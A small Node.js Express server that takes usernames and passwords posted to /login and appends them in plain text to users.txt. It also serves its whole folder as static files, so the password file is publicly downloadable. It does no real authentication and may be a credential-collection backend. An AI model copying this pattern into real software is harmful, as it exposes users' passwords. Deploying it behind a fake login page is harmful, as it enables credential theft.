const express = require("express");
const fs = require("fs");
const path = require("path");

const app = express();

// Read form data
app.use(express.urlencoded({ extended: true }));

// Serve files from current folder
app.use(express.static(__dirname));

// Open index.html when someone visits the site
app.get("/", (req, res) => {
    res.sendFile(path.join(__dirname, "index.html"));
});

// Receive form data
app.post("/login", (req, res) => {
    const username = req.body.username;
    const password = req.body.password;

    const data = `Username: ${username}, Password: ${password}\n`;

    fs.appendFile("users.txt", data, (err) => {
        if (err) {
            console.error(err);
            return res.send("Error saving data");
        }

        res.send("Data saved successfully");
    });
});

// Render uses its own port
const PORT = process.env.PORT || 3000;

app.listen(PORT, () => {
    console.log(`Server running on port ${PORT}`);
});